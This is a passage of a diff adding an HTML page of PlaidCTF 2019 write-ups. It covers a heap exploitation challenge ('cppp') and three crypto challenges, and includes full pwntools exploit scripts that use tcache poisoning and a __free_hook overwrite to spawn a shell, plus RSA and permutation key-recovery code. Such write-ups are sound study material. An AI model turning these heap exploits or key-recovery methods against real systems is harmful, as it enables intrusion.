+<span class="hljs-keyword">add</span><span class="bash">(0x4,<span class="hljs-string">"a"</span>*0x4)
+</span>remove(<span class="hljs-number">0</span>)
+<span class="hljs-keyword">add</span><span class="bash">(0x20,<span class="hljs-string">'a'</span>*0x20)
+</span><span class="hljs-keyword">add</span><span class="bash">(0x30,<span class="hljs-string">'a'</span>*0x30)
+</span><span class="hljs-keyword">add</span><span class="bash">(0x28,flat(0,0,0,0x31,0x630))
+</span>recant(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>x30,flat(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x630)+p64(<span class="hljs-number">0</span>x151))
+
+<span class="hljs-keyword">add</span><span class="bash">(0x500,<span class="hljs-string">'a'</span>*0x500)
+</span><span class="hljs-keyword">add</span><span class="bash">(1,<span class="hljs-string">"a"</span>)
+</span>remove(<span class="hljs-number">3</span>)
+Print(<span class="hljs-number">2</span>)
+r.recvuntil(<span class="hljs-string">"&gt; "</span>)
+r.recvn(<span class="hljs-number">0</span>x430)
+heap = u64(r.recvn(<span class="hljs-number">0</span>x8)) - <span class="hljs-number">0</span>x26a0
+r.recvn(<span class="hljs-number">0</span>x1f0)
+libc = u64(r.recvn(<span class="hljs-number">0</span>x8)) - <span class="hljs-number">0</span>x3ebca0
+
+print hex(heap)
+print hex(libc)
+
+<span class="hljs-keyword">add</span><span class="bash">(0x4,<span class="hljs-string">"a"</span>*0x4)
+</span>remove(<span class="hljs-number">3</span>)
+<span class="hljs-keyword">add</span><span class="bash">(0x4,<span class="hljs-string">"a"</span>*0x4)
+</span>remove(<span class="hljs-number">3</span>)
+<span class="hljs-keyword">add</span><span class="bash">(0x30,<span class="hljs-string">'a'</span>*0x30)
+</span>
+data = flat(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,
+        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,
+   <span class="hljs-number">0</span>x0,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,
+   libc+<span class="hljs-number">0</span>x3ed8e8,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,
+    <span class="hljs-number">0</span>x120,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x31,)
+data += p64(len(data)+<span class="hljs-number">0</span>x10)
+<span class="hljs-keyword">add</span><span class="bash">(len(data),data)
+</span>recant(<span class="hljs-number">5</span>,len(data)+<span class="hljs-number">8</span>,data+p64(<span class="hljs-number">0</span>x8d1))
+<span class="hljs-keyword">add</span><span class="bash">(0x3,<span class="hljs-string">"sh\x00"</span>)
+</span><span class="hljs-keyword">add</span><span class="bash">(0x20,p64(libc+0x4f440)+p64(0)*3)
+</span>
+remove(<span class="hljs-number">6</span>)
+
+r.interactive()
+
+</code></pre><h3 id="cppp"><a class="header-link" href="#cppp"></a>cppp</h3>
+<p>The service is written in C++, which allow us to add/remove/view a data. Each data will be appended to a vector, and can be removed/viewed by providing the index of the data.</p>
+<h4 id="vulnerability"><a class="header-link" href="#vulnerability"></a>Vulnerability</h4>
+<p>After playing around with the service, we found that</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(name, data)</span></span> <span class="hljs-comment">// data size = 0x20</span>
+<span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(name, data)</span></span>
+<span class="hljs-function"><span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>
+<span class="hljs-function"><span class="hljs-title">view</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>
+</code></pre><p>will leak the heap address. Also </p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(name, data)</span></span> <span class="hljs-comment">// data size = 0x20</span>
+<span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(name, data)</span></span>
+<span class="hljs-function"><span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>
+<span class="hljs-function"><span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>
+</code></pre><p>will make tcache_entry[0] ( chunk size 0x20 )  contains duplicate memory chunks, which allow us to use tcache poisoning to achieve arbitrary write primitive.</p>
+<h4 id="exploitation"><a class="header-link" href="#exploitation"></a>Exploitation</h4>
+<p>First we leak the heap address. Then we allocate data ( size = 0x90 ) for 8 times, and free them all. This will make libc address appears on the heap memory, so later we can leak it with arbitrary read primitive.</p>
+<p>To achieve arbitrary read, we use tcache poisoning to overwrite the fd pointer of the tcache entry and let it point to the beginning of the data vector. Next time when we add a data with size 0x200, we&#39;ll be able to control the content ( including the data pointer ) of the data vector. With a fake data vector, we can leak the libc address by viewing the data we forged inside the vector. </p>
+<p>After that, just use tcache poisoning again to overwrite the tcache entry&#39;s fd pointer to <code>__free_hook</code>, then overwrite the function pointer to <code>system</code> and call <code>free(&#39;sh&#39;)</code> ( now <code>system(&#39;sh&#39;)</code> ) to get the shell and the flag.</p>
+<p>Final exploit script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+elf = ELF(<span class="hljs-string">"./cppp_noalarm"</span>)
+libc = ELF(<span class="hljs-string">"./libc-2.27_50390b2ae8aaa73c47745040f54e602f.so"</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name, buf)</span>:</span>
+    r.sendlineafter(<span class="hljs-string">":"</span>, <span class="hljs-string">"1"</span>)
+    r.sendlineafter(<span class="hljs-string">"name:"</span>, name)
+    r.sendlineafter(<span class="hljs-string">"buf:"</span>, buf)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span>
+    r.sendlineafter(<span class="hljs-string">":"</span>, <span class="hljs-string">"2"</span>)
+    r.sendlineafter(<span class="hljs-string">"idx:"</span>, str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span><span class="hljs-params">(idx)</span>:</span>
+    r.sendlineafter(<span class="hljs-string">":"</span>, <span class="hljs-string">"3"</span>)
+    r.sendlineafter(<span class="hljs-string">"idx:"</span>, str(idx))
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+
+    r = remote(<span class="hljs-string">"cppp.pwni.ng"</span>, <span class="hljs-number">4444</span>)
+
+    <span class="hljs-comment"># leak heap</span>
+    add(<span class="hljs-string">"1111"</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x200</span>)
+    add(<span class="hljs-string">"2222"</span>, <span class="hljs-string">"b"</span>*<span class="hljs-number">0x200</span>)
+    remove(<span class="hljs-number">0</span>)
+    view(<span class="hljs-number">0</span>)
+    r.recvuntil(<span class="hljs-string">" "</span>)
+    heap = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x13290</span> - <span class="hljs-number">0xc30</span> 
+    log.success(<span class="hljs-string">"heap: {:#x}"</span>.format(heap))
+
+    remove(<span class="hljs-number">0</span>) <span class="hljs-comment"># duplicate tcache 0x210</span>
+
+    <span class="hljs-comment"># make libc address appears on heap</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># allocate 0x90 * 8</span>
+        log.info(<span class="hljs-string">"alloc 0x90:{}"</span>.format(i))
+        c = chr(ord(<span class="hljs-string">'a'</span>) + i)
+        add(str(i)*<span class="hljs-number">4</span>, c*<span class="hljs-number">0x80</span>)
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>): <span class="hljs-comment"># free 0x90*8</span>
+        log.info(<span class="hljs-string">"del 0x90:{}"</span>.format(i))
+        remove(i)
+
+    <span class="hljs-comment"># next allocate 0x210 from tcache ( overwrite fd )</span>
+    vector_begin = heap + <span class="hljs-number">0x146f0</span>
+    payload = p64(vector_begin).ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">'z'</span>)
+    add(<span class="hljs-string">"1111"</span>, payload)
+    <span class="hljs-comment"># fake vector</span>
+    libc_ptr = heap + <span class="hljs-number">0x149a0</span>
+    tcache20 = heap + <span class="hljs-number">0x14750</span>
+    payload = <span class="hljs-string">"i"</span>*<span class="hljs-number">8</span> + p64(libc_ptr) + p64(libc_ptr) + p64(<span class="hljs-number">8</span>) + <span class="hljs-string">"i"</span>*<span class="hljs-number">16</span> <span class="hljs-comment"># idx 0</span>
+    payload += p64(<span class="hljs-number">8</span>) + p64(tcache20) + p64(libc_ptr) + p64(<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) <span class="hljs-comment"># idx 1</span>
+    payload += p64(<span class="hljs-number">8</span>) + p64(tcache20) + p64(libc_ptr) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">21</span>) <span class="hljs-comment"># idx 2</span>
+    payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">"\x00"</span>)
+    add(p64(heap+<span class="hljs-number">0x50</span>), payload)
+    <span class="hljs-comment"># leak libc</span>
+    view(<span class="hljs-number">0</span>)
+    r.recvuntil(<span class="hljs-string">" "</span>)
+    libc.address = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x3ebca0</span>
+    log.success(<span class="hljs-string">"libc.address: {:#x}"</span>.format(libc.address))
+    <span class="hljs-comment"># make tcache 0x20 duplicate</span>
+    add(<span class="hljs-string">"1"</span>, <span class="hljs-string">"sh\x00"</span>)
+    add(<span class="hljs-string">"2"</span>, <span class="hljs-string">"sh\x00"</span>)
+    remove(<span class="hljs-number">0</span>)
+    remove(<span class="hljs-number">0</span>)
+    <span class="hljs-comment"># overwrite __free_hook to system</span>
+    add(<span class="hljs-string">"4"</span>, p64(libc.symbols.__free_hook))
+    add(<span class="hljs-string">"5"</span>, p64(libc.symbols.system))
+    <span class="hljs-comment"># will call free("sh")</span>
+    add(<span class="hljs-string">"6"</span>, <span class="hljs-string">"sh"</span>.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">"\x00"</span>))
+    r.interactive()
+</code></pre><p>flag: <code>PCTF{ccccccppppppppppppPPPPP+++++!}</code></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="splaid-cypress"><a class="header-link" href="#splaid-cypress"></a>SPlaid Cypress</h3>
+<h4 id="tl;dr-1"><a class="header-link" href="#tl;dr-1"></a>TL;DR</h4>
+<ol class="list">
+<li>Find those known plaintext.</li>
+<li>Count the mean and variance of output bit length at each position.</li>
+<li>Reconstruct the splay tree from the end.</li>
+<li>Recover central directory file header.</li>
+<li>Reconstruct local file header based on central directory file header.</li>
+<li>Reconstruct the initial splay tree.</li>
+<li>Decrypt the zip and enjoy the flag.</li>
+</ol>
+<p>The writeup is quite long, you can read it <a href="https://sasdf.cf/ctf/writeup/2019/plaid/crypto/cypress/">here</a>.
+Briefly, It tooks me a lot of time find features to segment the bitstream, and find a way to generate plaintext similar to the secret.</p>
+<h3 id="horst"><a class="header-link" href="#horst"></a>Horst</h3>
+<p>We are given two files: the main script <code>horst.py</code>, used for encryption and decryption; <code>data.txt</code>, which includes two plaintext-ciphertext pairs. The encryption function is defined as follows:</p>
+<pre class="hljs"><code>M = <span class="hljs-number">3</span>
+...
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(m, k)</span>:</span>
+    x, y = m
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(M):
+        x, y = (y, x * k.inv() * y * k)
+    <span class="hljs-keyword">return</span> x, y
+</code></pre><p>where <code>x</code>, <code>y</code> are both permutations of the set <code>{1, 2, ..., 64}</code>. Our goal is to recover the key <code>k</code>. After some calculations (of 3 round encryption), we know that if the plaintext is <code>(x, y)</code>, then the ciphertext would be <code>(yk&#39;xk&#39;ykk, xk&#39;yyk&#39;xk&#39;ykkk)</code>, where <code>k&#39;</code> is <code>k.inv()</code>, as defined in the main script, the inverse of <code>k</code>.
+Let <code>(x1, y1)</code>, <code>(c1, d1)</code> be the plaintext and ciphertext of the first pair, respectively. <code>(x2, y2)</code> and <code>(c2, d2)</code> follow the similar definitions. Notice that <code>d1d2&#39; = x1k&#39;y1c1c2&#39;y2&#39;kx2&#39;</code> holds. Let <code>t = x1&#39;d1d2&#39;x2</code> and <code>b = y1c1c2&#39;y2&#39;</code>, we have <code>t = k&#39;bk</code>, that is, <code>t</code> is a conjugate of <code>b</code> with respect to <code>k&#39;</code>. According to <a href="http://mathonline.wikidot.com/conjugate-cycles">Theorem 2</a>, if we know the cycle notations of <code>b</code> and <code>t</code>, then we can construct <code>u</code> such that <code>t = ubu&#39;</code>, and <code>u</code> will be a candidate of <code>k&#39;</code>. Here is the exploit:</p>
+<pre class="hljs"><code><span class="hljs-comment"># cycles of b</span>
+v1 = map(int, <span class="hljs-string">'0 53 9 62 2 36 59 25 39 58 34 41 63 30 21 49 16 3 52 37 57 10 40 8 5 55 24 4 17 29 32 31 27 19 6 7 47 51'</span>.split())
+v2 = map(int, <span class="hljs-string">'1 15 26 18 61 56 38 42 11 35 43 44 22 54 60 46 20 14 28 23 33 13 48 12 45 50'</span>.split())
+
+<span class="hljs-comment"># cycles of t = k^-1 * b * k</span>
+w1 = map(int, <span class="hljs-string">'1 11 46 43 30 17 34 59 23 6 38 50 39 45 47 36 20 52 63 21 4 10 54 24 29 18 9 42 57 37 27 15 62 41 55 40 58 56'</span>.split())
+w2 = map(int, <span class="hljs-string">'0 61 16 48 31 25 49 3 51 12 28 26 8 7 13 44 2 35 60 53 5 32 33 14 22 19'</span>.split())
+
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(len(v1)):
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(len(v2)):
+        k = [<span class="hljs-keyword">None</span>] * N
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(v2)):
+            k[v2[i]] = w2[i]
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(v1)):
+            k[v1[i]] = w1[i]
+        m = Permutation(k)
+        <span class="hljs-keyword">if</span> (x1, y1) == decrypt((c1, d1), m) <span class="hljs-keyword">and</span> (x2, y2) == decrypt((c2, d2), m):
+            <span class="hljs-keyword">print</span> <span class="hljs-string">"The flag is: PCTF{%s}"</span> % sha1(str(m)).hexdigest()
+        v2 = [v2[<span class="hljs-number">-1</span>]] + v2[:<span class="hljs-number">-1</span>]
+    v1 = [v1[<span class="hljs-number">-1</span>]] + v1[:<span class="hljs-number">-1</span>]
+</code></pre><p>Flag: <code>PCTF{69f4153d282560cdaab05e14c9f1b7e0a5cc74d1}</code></p>
+<h3 id="r-u-sad?"><a class="header-link" href="#r-u-sad?"></a>R u SAd?</h3>
+<p>We are given three files: the main script <code>rusad</code>, which can generate an RSA key and use it to encrypt/decrypt files; an encrypted flag <code>flag.enc</code>; a public key <code>key.sad.pub</code>. We first examine the public key:</p>
+<pre class="hljs"><code><span class="hljs-meta">&gt;&gt;&gt; </span>key = pickle.load(open(<span class="hljs-string">'key.sad.pub'</span>, <span class="hljs-string">'rb'</span>))
+<span class="hljs-meta">&gt;&gt;&gt; </span>dir(key)
+[<span class="hljs-string">'E'</span>, <span class="hljs-string">'N'</span>, <span class="hljs-string">'PRIVATE_INFO'</span>, ..., <span class="hljs-string">'bits'</span>, <span class="hljs-string">'iPmQ'</span>, <span class="hljs-string">'iQmP'</span>, <span class="hljs-string">'ispriv'</span>, <span class="hljs-string">'ispub'</span>, <span class="hljs-string">'priv'</span>, <span class="hljs-string">'pub'</span>]
+</code></pre><p><code>iQmP</code> and <code>iPmQ</code> are variables used for decryption, and they haven&#39;t been deleted when the public key is exported. From the source code, the two variables are defined as follows:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a1, a2)</span>:</span>
+        x1, x2 = <span class="hljs-number">1</span>, <span class="hljs-number">0</span>
+        y1, y2 = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>
+        <span class="hljs-keyword">while</span> a2:
+                q = a1 // a2
+                a1, a2 = a2, a1 - q * a2
+                x1, x2 = x2, x1 - q * x2
+                y1, y2 = y2, y1 - q * y2
+        <span class="hljs-keyword">return</span> (x1, y1, a1)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genkey</span><span class="hljs-params">(bits)</span>:</span>
+    ...
+    iQmP, iPmQ, _ = egcd(q, p)
+    <span class="hljs-keyword">return</span> Key(
+        N=p*q, P=p, Q=q, E=e, D=d%((p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)), DmP1=d%(p<span class="hljs-number">-1</span>), DmQ1=d%(q<span class="hljs-number">-1</span>),
+        iQmP=iQmP%p, iPmQ=iPmQ%q, bits=bits,
+    )
+</code></pre><p>where <code>p</code> and <code>q</code> are both 2048-bit primes. Let <code>a1, a2, _ = egcd(q, p)</code>, and thus, <code>a1 * q + a2 * p = 1</code>. Note that <code>-p &lt; a1 &lt; p</code>, <code>-q &lt; a2 &lt; q</code> and <code>a1 * a2 &lt; 0</code>. It implies that <code>(iQmP, iPmQ)</code> has two possibilities: <code>(a1, a2 + q)</code> or <code>(a1 + p, a2)</code>.</p>
+<p>Now consider the equation <code>c1 * iQmP + c2 * iPmQ = n + 1</code>, where <code>n = p * q</code>. We know that <code>(c1, c2) = (q, p)</code> is a solution in both cases of <code>(iPmQ, iQmP)</code>. Thus, the general solution of the equation is <code>(q + k * iPmQ, p - k * iQmP)</code>, where <code>k</code> is an integer. To find <code>q</code>, we could first find a solution <code>(d1, d2)</code>. Since <code>d1 = q + k&#39; * iPmQ</code> for some <code>k&#39;</code>, we search for <code>q</code> by adding (or subtracting) a multiple of <code>iPmQ</code> from <code>d1</code>. Exploit:</p>
+<pre class="hljs"><code>t1, t2, g = egcd(key.iQmP, key.iPmQ)
+<span class="hljs-comment"># g = 1</span>
+d1, d2 = (key.N+<span class="hljs-number">1</span>)*t1, (key.N+<span class="hljs-number">1</span>)*t2
+k = (d1-(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">2048</span>))//key.iPmQ
+q = (d1-k*key.iPmQ)
+
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    <span class="hljs-keyword">if</span> key.N % q == <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">break</span>
+    q -= key.iPmQ
+p = key.N // q
+
+<span class="hljs-comment"># recover the private variables of the key</span>
+d, _, g = egcd(key.E, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))
+orig_key = Key(
+    N=key.N, P=p, Q=q, E=key.E, D=d%((p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)),
+    DmP1=d%(p<span class="hljs-number">-1</span>), DmQ1=d%(q<span class="hljs-number">-1</span>),
+    iQmP=key.iQmP%p, iPmQ=key.iPmQ%q, bits=key.bits
+)
+pickle.dump(orig_key, open(<span class="hljs-string">'orig.key'</span>, <span class="hljs-string">'wb'</span>))
+</code></pre><p>Then we decrypt the flag.</p>
+<pre class="hljs"><code>./rusad decrypt -<span class="hljs-selector-tag">i</span> flag<span class="hljs-selector-class">.enc</span> -o dec<span class="hljs-selector-class">.txt</span> -k orig<span class="hljs-selector-class">.key</span>
+</code></pre><p>Flag: <code>PCTF{Rub_your_hands_palm_to_palm_vigorously_for_at_least_20_seconds_to_remove_any_private_information}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
